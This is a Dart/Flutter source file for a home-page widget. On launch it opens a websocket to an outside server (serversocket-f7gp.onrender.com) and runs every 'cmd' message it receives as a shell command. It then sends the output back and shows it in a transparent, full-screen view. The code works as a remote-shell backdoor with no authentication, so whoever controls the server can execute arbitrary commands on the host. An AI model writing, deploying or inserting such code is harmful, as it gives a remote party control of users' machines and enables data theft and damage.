import 'dart:developer';

import 'package:flutter/material.dart';
import 'package:process_run/process_run.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  late IO.Socket socket;
  String socketURI = "https://serversocket-f7gp.onrender.com";
  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    // runCommand();
    socketInit();
  }

  String outout = "";

  socketInit() {
    try {
      // socket = IO.io("http://192.168.1.13:8000", <String, dynamic>{
      //   'transports': ['websocket'],
      //   'autoConnect': true
      // });
      socket = IO.io("${socketURI}", <String, dynamic>{
        'transports': ['websocket'],
        'autoConnect': true
      });
      socket.connect();

      socket.connect();
      socket.onConnect((data) => {
            log('connect: ${socket.id}'),
          });
      socket.on("cmd", (data) {
        setState(() {
          runCommand(data);
        });
      });
    } catch (e) {
      print(e);
    }
  }

  runCommand(String command) async {
    try {
      var shell = Shell(throwOnError: false);
      var process = await shell.run('''

      ${command}

      ''');
      if (process.first.exitCode != 0) {
        outout = process.outText;
        socket.emit("commandOutPut", outout);
        return;
      }
      setState(() {
        outout = "Exit code : ${process.first.exitCode}\n" + process.outText;
        socket.emit("commandOutPut",
            "Exit code : ${process.first.exitCode}\n" + process.outText);
      });
    } catch (e) {
      print(e);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.transparent,
      body: Container(
        color: Colors.transparent,
        height: double.infinity,
        width: double.infinity,
        child: outout == ""
            ? Container()
            : SingleChildScrollView(child: Text("${outout}")),
      ),
    );
  }
}
